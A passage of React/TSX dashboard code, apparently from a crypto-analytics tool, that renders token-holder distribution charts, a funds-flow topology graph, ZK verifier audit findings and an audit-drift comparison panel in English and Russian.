                              </td>
                              <td className="py-2.5 px-3 text-[11px]">
                                <div>MCap: {row.market_cap ? `$${fmt(row.market_cap)}` : "—"}</div>
                                <div className="text-muted-foreground">Vol: {row.volume_24h ? `$${fmt(row.volume_24h)}` : "—"}</div>
                              </td>
                              <td className="py-2.5 px-3 text-[11px]">
                                <div>OI: {row.oi_total ? `$${fmt(row.oi_total)}` : "—"}</div>
                                <div className="text-muted-foreground">
                                  Fund: {row.funding_rate !== null && row.funding_rate !== undefined ? Number(row.funding_rate).toFixed(6) : "—"}
                                </div>
                              </td>
                              <td className="py-2.5 px-3 text-[11px]">
                                <span className="text-destructive">M:{row.manipulation_risk}</span> ·{" "}
                                <span className="text-amber-400">C:{row.crowd_overcrowding}</span> ·{" "}
                                <span className="text-emerald-400">O:{row.organic_probability}%</span>
                              </td>
                              <td className="py-2.5 px-3">
                                <div className="flex flex-wrap gap-1 max-w-[220px]">
                                  {(row.top_signals || []).length === 0 ? (
                                    <span className="text-muted-foreground">CLEAN</span>
                                  ) : (
                                    (row.top_signals || []).map((sg: string, sgi: number) => (
                                      <span key={sgi} className="rounded border border-border bg-background px-1.5 py-0.5 text-[9px] text-primary">
                                        {sg}
                                      </span>
                                    ))
                                  )}
                                </div>
                              </td>
                              <td className="py-2.5 px-3 text-right">
                                <button
                                  type="button"
                                  onClick={(ev) => {
                                    ev.stopPropagation();
                                    setSelectedTrendingDossier(isSelected ? null : row.dossier);
                                  }}
                                  className={`rounded-lg border px-2.5 py-1 text-[10px] font-bold transition-all ${
                                    isSelected
                                      ? "border-primary bg-primary text-primary-foreground shadow"
                                      : "border-primary/40 bg-primary/10 text-primary hover:bg-primary hover:text-primary-foreground"
                                  }`}
                                >
                                  {isSelected ? (isRu ? "▲ Свернуть" : "▲ Hide") : isRu ? "▼ 📊 Досье" : "▼ 📊 Dossier"}
                                </button>
                              </td>
                            </tr>
                            {isSelected && row.dossier && (
                              <tr className="bg-background/90">
                                <td colSpan={9} className="p-3 sm:p-4 border-l-2 border-l-primary">
                                  {renderMarketDossier(row.dossier, () => setSelectedTrendingDossier(null))}
                                </td>
                              </tr>
                            )}
                          </tbody>
                        );
                      })}
                    </tbody>
                  </table>
                </div>
              </div>
            </div>
          );
        }

        return renderMarketDossier(result);
      })()}

      {result && tool === "holders" && (
        <div className="space-y-4 font-mono">
          {/* Top Infographic Card: SVG Donut Ring + Stacked Supply Bar + Concentration Gauges */}
          <div className="grid grid-cols-1 gap-4 lg:grid-cols-12">
            {/* Left: SVG Donut Chart + Legend (5 cols) */}
            <div className="rounded-xl border border-border bg-card p-5 lg:col-span-5 flex flex-col justify-between">
              <div className="flex items-center justify-between mb-3">
                <div>
                  <p className="text-[10px] uppercase tracking-wider text-primary font-bold">
                    {isRu ? "Инфографика распределения эмиссии" : "Token Supply Distribution"}
                  </p>
                  <p className="text-xs text-muted-foreground mt-0.5">
                    {result.token_symbol ? `$${result.token_symbol} · ` : ""}{String(result.chain || "").toUpperCase()}
                  </p>
                </div>
                <span
                  className={`rounded-full px-3 py-1 text-xs font-bold border ${
                    result.centralization_risk === "CRITICAL" || result.centralization_risk === "HIGH"
                      ? "bg-destructive/20 text-destructive border-destructive/40"
                      : "bg-primary/15 text-primary border-primary/40"
                  }`}
                >
                  {result.centralization_risk} · {result.centralization_score}/100
                </span>
              </div>

              <div className="flex flex-col sm:flex-row items-center gap-5 my-2">
                {/* SVG Donut Chart */}
                <div className="relative h-36 w-36 shrink-0">
                  <svg viewBox="0 0 42 42" className="h-full w-full -rotate-90">
                    <circle cx="21" cy="21" r="15.915" fill="transparent" stroke="hsl(var(--border))" strokeWidth="4.5" />
                    {(() => {
                      let accum = 0;
                      const segs = (result.distribution_segments || []).filter((s: any) => Number(s.pct) > 0);
                      return segs.map((seg: any, idx: number) => {
                        const pct = Math.max(0, Math.min(100, Number(seg.pct)));
                        const dash = `${pct} ${100 - pct}`;
                        const offset = 100 - accum;
                        accum += pct;
                        return (
                          <circle
                            key={idx}
                            cx="21"
                            cy="21"
                            r="15.915"
                            fill="transparent"
                            stroke={seg.color}
                            strokeWidth="4.5"
                            strokeDasharray={dash}
                            strokeDashoffset={offset}
                          />
                        );
                      });
                    })()}
                  </svg>
                  <div className="absolute inset-0 flex flex-col items-center justify-center text-center">
                    <span className="text-[10px] uppercase text-muted-foreground">Top-10</span>
                    <span className="text-base font-bold text-foreground">{result.top10_pct}%</span>
                    <span className="text-[9px] text-primary">HHI {result.hhi_index ?? "—"}</span>
                  </div>
                </div>

                {/* Segments Legend */}
                <div className="flex-1 w-full space-y-1.5 text-xs">
                  {(result.distribution_segments || []).map((seg: any, idx: number) => (
                    <div key={idx} className="flex items-center justify-between gap-2">
                      <div className="flex items-center gap-2">
                        <span className="h-2.5 w-2.5 rounded-sm shrink-0" style={{ backgroundColor: seg.color }} />
                        <span className="text-[11px] text-muted-foreground truncate">{seg.label}</span>
                      </div>
                      <b className="text-[11px] text-foreground">{seg.pct}%</b>
                    </div>
                  ))}
                </div>
              </div>

              {/* Stacked Horizontal Bar */}
              <div className="mt-3 space-y-1">
                <div className="h-3 w-full overflow-hidden rounded-full bg-background border border-border flex">
                  {(result.distribution_segments || []).map((seg: any, idx: number) =>
                    Number(seg.pct) > 0 ? (
                      <div
                        key={idx}
                        style={{ width: `${seg.pct}%`, backgroundColor: seg.color }}
                        title={`${seg.label}: ${seg.pct}%`}
                      />
                    ) : null
                  )}
                </div>
              </div>
            </div>

            {/* Right: Concentration Matrix & Whale Metrics (7 cols) */}
            <div className="rounded-xl border border-border bg-card p-5 lg:col-span-7 space-y-4">
              <p className="text-[10px] uppercase tracking-wider text-primary font-bold">
                {isRu ? "Матрица концентрации китов и смарт-контрактов" : "Whale & Contract Concentration Matrix"}
              </p>
              <div className="grid grid-cols-2 gap-3 sm:grid-cols-3">
                {[
                  { k: isRu ? "Всего холдеров" : "Total Holders", v: fmt(result.total_holders, 0), sub: "Indexed wallets" },
                  { k: "Top-1 Holder", v: `${result.top1_pct ?? 0}%`, sub: isRu ? "Крупнейший адрес" : "Largest single holder" },
                  { k: "Top-5 Holders", v: `${result.top5_pct ?? 0}%`, sub: isRu ? "Топ-5 кошельков" : "Top 5 combined" },
                  { k: "Top-10 (All)", v: `${result.top10_pct}%`, sub: isRu ? "Все топ-10 адресов" : "Including LP/Burn" },
                  { k: "Top-10 (Real EOA)", v: `${result.top10_real_pct}%`, sub: isRu ? "Без пулов и сжигания" : "Excl. pools & burn" },
                  { k: "Whales / CEX", v: `${result.whale_pct}% / ${result.cex_pct}%`, sub: `LP: ${result.pool_pct}% · Burn: ${result.burn_pct}%` },
                ].map((c, i) => (
                  <div key={i} className="rounded-xl border border-border bg-background p-3.5">
                    <p className="text-[10px] uppercase text-muted-foreground">{c.k}</p>
                    <p className="mt-1 text-base font-bold text-foreground">{c.v}</p>
                    <p className="mt-0.5 text-[10px] text-muted-foreground">{c.sub}</p>
                  </div>
                ))}
              </div>

              {/* Tier concentration bars */}
              <div className="space-y-2 pt-1">
                {[
                  { label: isRu ? "Доля китов (EOA Whales)" : "EOA Whales Share", val: Number(result.whale_pct || 0), color: "bg-red-500" },
                  { label: isRu ? "Реальная концентрация Топ-10 (без LP/Burn)" : "Real Top-10 Concentration", val: Number(result.top10_real_pct || 0), color: "bg-amber-500" },
                  { label: isRu ? "Ликвидность в пулах (DEX LP) + CEX" : "DEX Liquidity + CEX Custody", val: Number(result.pool_pct || 0) + Number(result.cex_pct || 0), color: "bg-emerald-500" },
                ].map((b, bi) => (
                  <div key={bi} className="space-y-1 text-xs">
                    <div className="flex justify-between">
                      <span className="text-muted-foreground">{b.label}</span>
                      <b className="text-foreground">{b.val.toFixed(2)}%</b>
                    </div>
                    <div className="h-2 w-full overflow-hidden rounded-full bg-background border border-border">
                      <div className={`h-full ${b.color}`} style={{ width: `${Math.min(100, b.val)}%` }} />
                    </div>
                  </div>
                ))}
              </div>
            </div>
          </div>

          {/* Visual Top Holders Table */}
          <div className="rounded-xl border border-border bg-card p-5">
            <div className="mb-3 flex flex-wrap items-center justify-between gap-2">
              <p className="text-[10px] uppercase tracking-wider text-primary font-bold">
                🐋 {isRu ? `Топ холдеров и идентифицированных сущностей (${result.top_holders?.length || 0})` : `Top Holders & Identified Entities (${result.top_holders?.length || 0})`}
              </p>
              {result.locked && (
                <span className="inline-flex items-center gap-1 text-[10px] text-primary">
                  <Lock size={11} /> {isRu ? "полные адреса и метки доступны с тарифа RADAR+" : "full addresses & labels require RADAR+"}
                </span>
              )}
            </div>
            <div className="space-y-1.5">
              {result.top_holders?.map((h: any) => {
                const htype = String(h.holder_type || "unknown").toLowerCase();
                const badgeIcon =
                  htype === "cex"
                    ? "🏦 CEX"
                    : htype === "pool" || htype === "dex"
                    ? "💧 LP POOL"
                    : htype === "burn"
                    ? "🔥 BURN"
                    : htype === "bridge"
                    ? "🌉 BRIDGE"
                    : h.is_contract
                    ? "📜 CONTRACT"
                    : "🐳 WHALE";
                return (
                  <div
                    key={h.rank}
                    className="relative overflow-hidden rounded-lg border border-border bg-background px-3.5 py-2.5"
                  >
                    <div
                      className="pointer-events-none absolute inset-y-0 left-0 bg-primary/10"
                      style={{ width: `${Math.min(100, Number(h.percentage || 0) * 1.8)}%` }}
                    />
                    <div className="relative flex flex-wrap items-center justify-between gap-3 text-xs">
                      <div className="flex items-center gap-2.5 min-w-0 flex-1">
                        <span className="w-7 text-[11px] font-bold text-muted-foreground">#{h.rank}</span>
                        <span className="rounded border border-border bg-card px-2 py-0.5 text-[10px] font-bold text-primary shrink-0">
                          {badgeIcon}
                        </span>
                        <span className="truncate font-semibold text-foreground select-all">{h.address}</span>
                        {h.label && h.label.toLowerCase() !== htype && (
                          <span className="truncate rounded bg-primary/15 px-2 py-0.5 text-[10px] font-bold text-primary">
                            {h.label}
                          </span>
                        )}
                      </div>
                      <div className="flex items-center gap-4">
                        {h.quantity > 0 && (
                          <span className="text-[11px] text-muted-foreground hidden sm:inline">
                            {fmt(h.quantity)} {result.token_symbol || ""}
                          </span>
                        )}
                        <span className="w-16 text-right text-xs font-bold text-primary">{h.percentage}%</span>
                      </div>
                    </div>
                  </div>
                );
              })}
            </div>
          </div>
        </div>
      )}

      {result && tool === "funds" && (
        <div className="space-y-4 font-mono">
          {/* Top Target & Scores Banner */}
          <div className="rounded-xl border border-border bg-card p-5 space-y-4">
            <div className="flex flex-wrap items-center justify-between gap-3 border-b border-border pb-3">
              <div className="flex flex-wrap items-center gap-2.5">
                <span className="rounded-lg border border-primary/40 bg-primary/15 px-2.5 py-1 text-xs font-bold text-primary">
                  {result.detected_mode === "LP POOL" ? "💧 LP POOL FLOW" : "📜 CONTRACT / ADDRESS FLOW"}
                </span>
                <span className="text-sm font-bold text-foreground">
                  {result.target_icon || "🎯"} {result.target_label || result.address}
                </span>
                <code className="text-xs text-muted-foreground">{result.address}</code>
              </div>
              <div className="flex flex-wrap items-center gap-2 text-xs">
                <span className="rounded border border-border bg-background px-2.5 py-1 text-muted-foreground">
                  Chain: <b className="text-foreground">{result.chain}</b> · Window: <b className="text-foreground">{result.days}d</b>
                </span>
                {result.dominant_token_symbol && (
                  <span className="rounded border border-primary/40 bg-primary/10 px-2.5 py-1 text-primary font-bold">
                    Token: {result.dominant_token_symbol}
                  </span>
                )}
              </div>
            </div>

            {/* 4 Score & Volume Cards */}
            <div className="grid grid-cols-2 gap-3 sm:grid-cols-4">
              {[
                { k: isRu ? "Риск потока (Risk Score)" : "Flow Risk Score", v: `${result.risk_score}/100` },
                { k: isRu ? "Манипуляции (Wash/Sybil)" : "Manipulation Score", v: `${result.manipulation_score}/100` },
                { k: isRu ? "Активность ботов (MEV/Bot)" : "Bot Activity Score", v: `${result.bot_activity_score}/100` },
                {
                  k: isRu ? "Транзакции / Профили" : "Txs / Profiled Addrs",
                  v: `${fmt(result.total_transactions, 0)} / ${fmt(result.unique_addresses, 0)}`,
                },
              ].map((c, i) => (
                <div key={i} className="rounded-xl border border-border bg-background p-3.5">
                  <p className="text-[10px] uppercase tracking-wider text-muted-foreground">{c.k}</p>
                  <p className="mt-1 text-lg font-bold text-foreground">{c.v}</p>
                </div>
              ))}
            </div>

            {/* CLI Pattern Breakdown Tree (6 Categories) */}
            {result.pattern_breakdown && (
              <div>
                <p className="mb-2 text-[10px] uppercase tracking-wider text-primary font-bold">
                  🔎 {isRu ? "Декомпозиция паттернов потока (CLI Telemetry)" : "Flow Pattern Decomposition"}
                </p>
                <div className="grid grid-cols-2 gap-2.5 sm:grid-cols-3 lg:grid-cols-6 text-xs">
                  {[
                    { k: "🤖 Bot patterns", v: result.pattern_breakdown.bot_patterns ?? 0 },
                    { k: "🔄 Wash trading", v: result.pattern_breakdown.wash_trading ?? 0 },
                    { k: "💸 Fund extraction", v: result.pattern_breakdown.fund_extraction ?? 0 },
                    { k: "⏱️ Timing anomalies", v: result.pattern_breakdown.timing_anomalies ?? 0 },
                    { k: "🏛️ CEX flows", v: result.pattern_breakdown.cex_flows ?? 0 },
                    { k: "🌐 Blockscout signals", v: result.pattern_breakdown.flow_signals ?? 0 },
                  ].map((pat, pi) => (
                    <div
                      key={pi}
                      className={`rounded-lg border p-2.5 ${
                        Number(pat.v) > 0
                          ? "border-primary/40 bg-primary/10 text-foreground"
                          : "border-border bg-background text-muted-foreground"
                      }`}
                    >
                      <p className="text-[10px]">{pat.k}</p>
                      <p className="mt-1 text-sm font-bold">{pat.v} signals</p>
                    </div>
                  ))}
                </div>
              </div>
            )}

            {/* Interactive SVG Funds Flow Topology Graph */}
            {result.topology_graph?.nodes?.length > 1 && (
              <div className="rounded-xl border border-border bg-background p-4 space-y-3">
                <div className="flex flex-wrap items-center justify-between gap-2">
                  <p className="text-[10px] uppercase tracking-wider text-primary font-bold">
                    🕸️ {isRu ? "Граф связей и потоков средств (Inflow → Target → Outflow)" : "Interactive Funds Flow Topology Graph"}
                  </p>
                  <span className="text-[10px] text-muted-foreground">
                    Inflow: <b className="text-emerald-400">{fmt(result.total_inflow)} {result.dominant_token_symbol}</b> · Outflow:{" "}
                    <b className="text-destructive">{fmt(result.total_outflow)} {result.dominant_token_symbol}</b> · Clusters:{" "}
                    <b className="text-primary">{result.cluster_count}</b>
                  </span>
                </div>

                <div className="overflow-x-auto">
                  <svg viewBox="0 0 860 320" className="w-full min-w-[680px] h-auto rounded-lg bg-card/60 border border-border/60">
                    {(() => {
                      const nodes = result.topology_graph.nodes || [];
                      const inNodes = nodes.filter((n: any) => n.role === "INFLOW");
                      const outNodes = nodes.filter((n: any) => n.role === "OUTFLOW");
                      const targetNode = nodes.find((n: any) => n.role === "TARGET") || { label: result.target_label || "Target", icon: "🎯" };
                      const cx = 430;
                      const cy = 160;
                      return (
                        <>
                          {/* Inflow Edges & Nodes (Left -> Center) */}
                          {inNodes.map((n: any, idx: number) => {
                            const ny = 40 + idx * (240 / Math.max(1, inNodes.length - 1 || 1));
                            const sy = inNodes.length === 1 ? 160 : ny;
                            return (
                              <g key={n.id}>
                                <path
                                  d={`M 230 ${sy} C 320 ${sy}, 330 ${cy}, ${cx - 75} ${cy}`}
                                  fill="none"
                                  stroke="#10b981"
                                  strokeWidth={Math.max(1.5, Math.min(5, (Number(n.share_pct) || 10) / 15))}
                                  strokeOpacity="0.65"
                                />
                                <rect x="20" y={sy - 18} width="210" height="36" rx="8" fill="hsl(var(--card))" stroke="#10b981" strokeWidth="1" />
                                <text x="30" y={sy - 2} fill="hsl(var(--foreground))" fontSize="10" fontWeight="bold">
                                  {n.icon} {String(n.label || n.address).slice(0, 22)}
                                </text>
                                <text x="30" y={sy + 11} fill="#10b981" fontSize="9">
                                  +{fmt(n.amount)} {n.symbol} ({n.share_pct}%)
                                </text>
                              </g>
                            );
                          })}

                          {/* Outflow Edges & Nodes (Center -> Right) */}
                          {outNodes.map((n: any, idx: number) => {
                            const ny = 40 + idx * (240 / Math.max(1, outNodes.length - 1 || 1));
                            const ey = outNodes.length === 1 ? 160 : ny;
                            return (
                              <g key={n.id}>
                                <path
                                  d={`M ${cx + 75} ${cy} C 530 ${cy}, 540 ${ey}, 630 ${ey}`}
                                  fill="none"
                                  stroke="#ef4444"
                                  strokeWidth={Math.max(1.5, Math.min(5, (Number(n.share_pct) || 10) / 15))}
                                  strokeOpacity="0.65"
                                />
                                <rect x="630" y={ey - 18} width="210" height="36" rx="8" fill="hsl(var(--card))" stroke="#ef4444" strokeWidth="1" />
                                <text x="640" y={ey - 2} fill="hsl(var(--foreground))" fontSize="10" fontWeight="bold">
                                  {n.icon} {String(n.label || n.address).slice(0, 22)}
                                </text>
                                <text x="640" y={ey + 11} fill="#ef4444" fontSize="9">
                                  -{fmt(n.amount)} {n.symbol} ({n.share_pct}%)
                                </text>
                              </g>
                            );
                          })}

                          {/* Center Target Hub */}
                          <rect x={cx - 75} y={cy - 34} width="150" height="68" rx="12" fill="hsl(var(--card))" stroke="hsl(var(--primary))" strokeWidth="2" />
                          <text x={cx} y={cy - 10} textAnchor="middle" fill="hsl(var(--primary))" fontSize="11" fontWeight="bold">
                            {targetNode.icon} {String(targetNode.label).slice(0, 18)}
                          </text>
                          <text x={cx} y={cy + 6} textAnchor="middle" fill="hsl(var(--foreground))" fontSize="9">
                            {result.address.slice(0, 8)}…{result.address.slice(-6)}
                          </text>
                          <text x={cx} y={cy + 22} textAnchor="middle" fill="hsl(var(--muted-foreground))" fontSize="9">
                            Risk: {result.risk_score}/100 · {result.detected_mode}
                          </text>
                        </>
                      );
                    })()}
                  </svg>
                </div>
              </div>
            )}

            {/* Top Senders & Top Receivers Counterparty Tables */}
            {(result.top_senders?.length > 0 || result.top_receivers?.length > 0) && (
              <div className="grid grid-cols-1 gap-3 lg:grid-cols-2 text-xs">
                <div className="rounded-xl border border-border bg-background p-4 space-y-2">
                  <p className="text-[10px] uppercase text-emerald-400 font-bold">
                    📥 Top Inflow Sources (Senders)
                  </p>
                  {(result.top_senders || []).map((s: any, idx: number) => (
                    <div key={idx} className="flex items-center justify-between gap-2 rounded border border-border bg-card px-3 py-2">
                      <div className="min-w-0 flex-1">
                        <div className="flex items-center gap-1.5">
                          <span>{s.icon}</span>
                          <span className="font-bold text-foreground truncate">{s.label}</span>
                          {s.is_bot && <span className="rounded bg-amber-500/20 px-1.5 py-0.5 text-[9px] text-amber-400">BOT</span>}
                        </div>
                        <p className="text-[10px] text-muted-foreground truncate select-all">{s.address}</p>
                      </div>
                      <div className="text-right">
                        <p className="font-bold text-emerald-400">+{fmt(s.amount)} {s.symbol}</p>
                        <p className="text-[10px] text-muted-foreground">{s.share_pct}%</p>
                      </div>
                    </div>
                  ))}
                </div>

                <div className="rounded-xl border border-border bg-background p-4 space-y-2">
                  <p className="text-[10px] uppercase text-destructive font-bold">
                    📤 Top Outflow Destinations (Receivers)
                  </p>
                  {(result.top_receivers || []).map((r: any, idx: number) => (
                    <div key={idx} className="flex items-center justify-between gap-2 rounded border border-border bg-card px-3 py-2">
                      <div className="min-w-0 flex-1">
                        <div className="flex items-center gap-1.5">
                          <span>{r.icon}</span>
                          <span className="font-bold text-foreground truncate">{r.label}</span>
                          {r.is_bot && <span className="rounded bg-amber-500/20 px-1.5 py-0.5 text-[9px] text-amber-400">BOT</span>}
                        </div>
                        <p className="text-[10px] text-muted-foreground truncate select-all">{r.address}</p>
                      </div>
                      <div className="text-right">
                        <p className="font-bold text-destructive">-{fmt(r.amount)} {r.symbol}</p>
                        <p className="text-[10px] text-muted-foreground">{r.share_pct}%</p>
                      </div>
                    </div>
                  ))}
                </div>
              </div>
            )}

            {/* Detected Clusters & Signals */}
            {result.clusters_detail?.length > 0 && (
              <div className="rounded-xl border border-border bg-background p-4 space-y-2 text-xs">
                <p className="text-[10px] uppercase text-primary font-bold">
                  🕸️ {isRu ? `Обнаруженные кластеры связанных кошельков (${result.cluster_count})` : `Detected Coordinated Wallet Clusters (${result.cluster_count})`}
                </p>
                <div className="grid grid-cols-1 gap-2 sm:grid-cols-2">
                  {result.clusters_detail.map((cl: any, ci: number) => (
                    <div key={ci} className="rounded border border-border bg-card p-3 space-y-1">
                      <div className="flex justify-between">
                        <span className="font-bold text-primary">{cl.cluster_id}</span>
                        <span className="text-muted-foreground">{cl.size} wallets</span>
                      </div>
                      <p className="text-[10px] text-muted-foreground break-all">
                        {(cl.members || []).join(", ")}
                      </p>
                    </div>
                  ))}
                </div>
              </div>
            )}

            {result.signals?.length > 0 && (
              <div className="space-y-2">
                <p className="text-[10px] uppercase tracking-wider text-primary font-bold">
                  {isRu ? "Сигналы аномалий потока" : "Flow Anomaly Signals"}
                </p>
                {result.signals.map((s: any, i: number) => (
                  <div key={i} className="rounded-lg border border-border bg-background p-3 text-xs">
                    <div className="flex items-center justify-between">
                      <span className="font-bold text-foreground">{s.type}</span>
                      <span className="text-[10px] text-primary font-bold">{s.severity} · {s.confidence}%</span>
                    </div>
                    <p className="mt-1 text-[11px] text-muted-foreground">{s.description}</p>
                  </div>
                ))}
              </div>
            )}
          </div>
        </div>
      )}

      {result && tool === "zk" && (
        <div className="rounded-xl border border-border bg-card p-5 space-y-4 font-mono text-xs">
          <div className="flex flex-wrap items-center justify-between gap-2 border-b border-border pb-3">
            <div>
              <span className="text-primary font-bold">{result.address}</span>
              <span className="ml-2 text-muted-foreground">({result.chain})</span>
            </div>
            <span
              className={`rounded border px-2.5 py-0.5 text-[11px] font-bold ${
                (result.critical_count || 0) > 0 || (result.high_count || 0) > 0
                  ? "border-red-500/50 bg-red-500/15 text-red-400"
                  : "border-green-500/50 bg-green-500/15 text-green-400"
              }`}
            >
              {result.verdict || "ZK AUDIT COMPLETE"} · Findings: {result.verifiers_found}
            </span>
          </div>

          {result.radar_metadata && (
            <div className="grid grid-cols-2 gap-3 sm:grid-cols-4">
              <div className="rounded-lg border border-border bg-background p-3">
                <p className="text-[10px] uppercase text-muted-foreground">ZK Radar v4 Match</p>
                <p className="mt-1 font-bold text-green-400">
                  ✅ {result.radar_metadata.discovery_method || "Indexed"}
                </p>
              </div>
              <div className="rounded-lg border border-border bg-background p-3">
                <p className="text-[10px] uppercase text-muted-foreground">Deploy Block</p>
                <p className="mt-1 font-bold text-foreground">
                  {result.radar_metadata.deploy_block || "—"}
                </p>
              </div>
              <div className="rounded-lg border border-border bg-background p-3">
                <p className="text-[10px] uppercase text-muted-foreground">Bytecode Size</p>
                <p className="mt-1 font-bold text-foreground">
                  {result.radar_metadata.bytecode_size || 0} bytes
                </p>
              </div>
              <div className="rounded-lg border border-border bg-background p-3">
                <p className="text-[10px] uppercase text-muted-foreground">Deployer EOA</p>
                <p className="mt-1 truncate font-bold text-primary">
                  {result.radar_metadata.deployer || "—"}
                </p>
              </div>
            </div>
          )}

          {Array.isArray(result.results) && result.results.length > 0 ? (
            <div className="space-y-2">
              {result.results.map((f: any, idx: number) => (
                <div key={idx} className="rounded-lg border border-border bg-background p-3 space-y-1">
                  <div className="flex items-center justify-between">
                    <span className="font-bold text-foreground">{f.title || f.vuln_type || "ZK Finding"}</span>
                    <span className="rounded border border-primary/40 bg-primary/10 px-2 py-0.5 text-[10px] font-bold text-primary">
                      {f.severity || "INFO"}
                    </span>
                  </div>
                  {f.description && <p className="text-[11px] text-muted-foreground">{f.description}</p>}
                </div>
              ))}
            </div>
          ) : (
            <p className="text-[11px] text-muted-foreground">
              {isRu
                ? "Уязвимостей кривой BN254, gamma==delta, подгрупповых атак G1/G2 или переполнения публичных входов не обнаружено."
                : "No BN254 curve membership, gamma==delta, G1/G2 subgroup, or public input overflow flaws detected."}
            </p>
          )}
        </div>
      )}

      {result && tool === "drift" && (
        <div className="space-y-4 font-mono text-xs">
          {result.mode === "repo_audit_drift" ? (
            <>
              <div className="grid grid-cols-2 gap-3 sm:grid-cols-4">
                {[
                  {
                    k: isRu ? "Найдено отчётов аудита" : "Audit Reports Found",
                    v: result.audits_exist ? `${result.audit_count} Reports` : isRu ? "0 (Нет PDF аудитов)" : "0 (No PDFs)",
                  },
                  {
                    k: isRu ? "Последний аудит / База" : "Last Audit / Baseline",
                    v: result.last_audit_date
                      ? `${result.last_audit_date}${result.audit_age_days ? ` (${result.audit_age_days}d · ${result.audit_recency})` : ""}`
                      : "—",
                  },
                  {
                    k: "Audit Drift Score",
                    v: `${result.drift_score ?? 0}/100`,
                  },
                  {
                    k: isRu ? "Общий риск дрифта" : "Overall Drift Risk",
                    v: result.overall_risk || "UNKNOWN",
                  },
                ].map((c, i) => (
                  <div key={i} className="rounded-xl border border-border bg-card p-4">
                    <p className="text-[10px] uppercase tracking-wider text-muted-foreground">{c.k}</p>
                    <p className="mt-1 text-base font-bold text-foreground">{c.v}</p>
                  </div>
                ))}
              </div>

              <div className="rounded-xl border border-border bg-card p-5 space-y-4">
                <div className="flex flex-wrap items-center justify-between gap-2 border-b border-border pb-3">
                  <div>
                    <a
                      href={result.repo_url}
                      target="_blank"
                      rel="noopener noreferrer"
                      className="text-sm font-bold text-primary hover:underline"
                    >
                      📦 {result.repo} ↗
                    </a>
                    {result.auditors?.length > 0 && (
                      <p className="mt-1 text-muted-foreground">
                        {isRu ? "Аудиторы:" : "Auditors:"}{" "}
                        <b className="text-foreground">{result.auditors.join(", ")}</b> ·{" "}
                        {isRu ? "Всего находок в PDF:" : "Total findings in PDFs:"}{" "}
                        <b className="text-primary">{result.total_audit_findings}</b>
                      </p>
                    )}
                  </div>
                  <span className="rounded border border-border bg-background px-2.5 py-1 text-[11px] text-muted-foreground">
                    Contracts: <b className="text-foreground">{result.repo_surface?.contracts_count ?? 0}</b> · Mocks/Tests:{" "}
                    <b className="text-foreground">{result.repo_surface?.mocks_and_tests_count ?? 0}</b> · Active Patterns:{" "}
                    <b className="text-primary">{result.repo_surface?.current_patterns_scanned ?? 0}</b>
                  </span>
                </div>

                {result.key_concerns?.length > 0 && (
                  <div className="space-y-1 rounded-lg border border-destructive/30 bg-destructive/10 p-3">
                    {result.key_concerns.map((kc: string, idx: number) => (
                      <p key={idx} className="text-destructive font-semibold">{kc}</p>
                    ))}
                  </div>
                )}

                {/* CLI Section: AUDIT vs CURRENT SCAN (Comparison & Severity Drift) */}
                {result.comparison && (
                  <div className="rounded-xl border border-primary/30 bg-background p-4 space-y-3">
                    <div className="flex flex-wrap items-center justify-between gap-2">
                      <p className="text-[10px] uppercase tracking-wider text-primary font-bold">
                        ⚖️ AUDIT vs CURRENT SCAN (CLI Parity Comparison)
                      </p>
                      <div className="flex items-center gap-2 text-[11px]">
                        <span className="rounded border border-border bg-card px-2 py-0.5">
                          Coverage Score: <b className="text-primary">{result.comparison.coverage_score}/100</b>
                        </span>
                        <span className="rounded border border-destructive/40 bg-destructive/15 px-2 py-0.5 font-bold text-destructive">
                          New Risk: {result.comparison.new_risk_level}
                        </span>
                      </div>
                    </div>

                    <div className="grid grid-cols-2 gap-2.5 sm:grid-cols-4 text-[11px]">
                      <div className="rounded border border-border bg-card p-2.5">
                        <p className="text-[10px] text-muted-foreground">Critical (Audit → Now)</p>
                        <p className="mt-1 font-bold text-foreground">
                          {result.comparison.audit_critical} → {result.comparison.current_critical}{" "}
                          <span className={result.comparison.critical_delta > 0 ? "text-destructive" : "text-emerald-400"}>
                            ({result.comparison.critical_delta >= 0 ? `+${result.comparison.critical_delta}` : result.comparison.critical_delta})
                          </span>
                        </p>
                      </div>
                      <div className="rounded border border-border bg-card p-2.5">
                        <p className="text-[10px] text-muted-foreground">High (Audit → Now)</p>
                        <p className="mt-1 font-bold text-foreground">
                          {result.comparison.audit_high} → {result.comparison.current_high}{" "}
                          <span className={result.comparison.high_delta > 0 ? "text-amber-400" : "text-emerald-400"}>
                            ({result.comparison.high_delta >= 0 ? `+${result.comparison.high_delta}` : result.comparison.high_delta})
                          </span>
                        </p>
                      </div>
                      <div className="rounded border border-border bg-card p-2.5">
                        <p className="text-[10px] text-muted-foreground">New Uncovered Issues</p>
                        <p className="mt-1 font-bold text-destructive">{result.comparison.new_issues_count}</p>
                      </div>
                      <div className="rounded border border-border bg-card p-2.5">
                        <p className="text-[10px] text-muted-foreground">Unaudited Contracts</p>
                        <p className="mt-1 font-bold text-amber-400">{result.comparison.unaudited_files_count}</p>
                      </div>
                    </div>

                    {result.comparison.uncovered_categories?.length > 0 && (
                      <div className="flex flex-wrap items-center gap-1.5 text-[11px]">
                        <span className="text-muted-foreground">Uncovered Vulnerability Classes:</span>
                        {result.comparison.uncovered_categories.map((uc: string, ui: number) => (
                          <span key={ui} className="rounded border border-amber-500/40 bg-amber-500/10 px-2 py-0.5 text-[10px] text-amber-300">
                            {uc}
                          </span>
                        ))}
                      </div>
                    )}

                    {result.comparison.new_issues?.length > 0 && (
                      <div className="space-y-1.5 pt-1">
                        <p className="text-[10px] uppercase text-muted-foreground font-bold">
                          {isRu ? "Новые паттерны в коде, не покрытые аудитом (File : Line):" : "New Code Patterns Not Covered by Audits (File : Line):"}
                        </p>
                        <div className="max-h-48 overflow-y-auto space-y-1 pr-1">
                          {result.comparison.new_issues.slice(0, 15).map((ni: any, nii: number) => (
                            <div key={nii} className="flex flex-wrap items-center justify-between gap-2 rounded border border-border bg-card px-2.5 py-1.5 text-[11px]">
                              <div className="flex items-center gap-2">
                                <span className="rounded bg-primary/15 px-1.5 py-0.5 text-[9px] font-bold text-primary">
                                  {ni.severity}
                                </span>
                                <span className="font-bold text-foreground">{ni.type}</span>
                              </div>
                              <code className="text-muted-foreground">
                                {ni.file}{ni.line ? `:${ni.line}` : ""}
                              </code>
                            </div>
                          ))}
                        </div>
                      </div>
                    )}

                    {result.comparison.unaudited_files?.length > 0 && (
                      <div className="pt-1">
                        <p className="mb-1 text-[10px] uppercase text-muted-foreground font-bold">
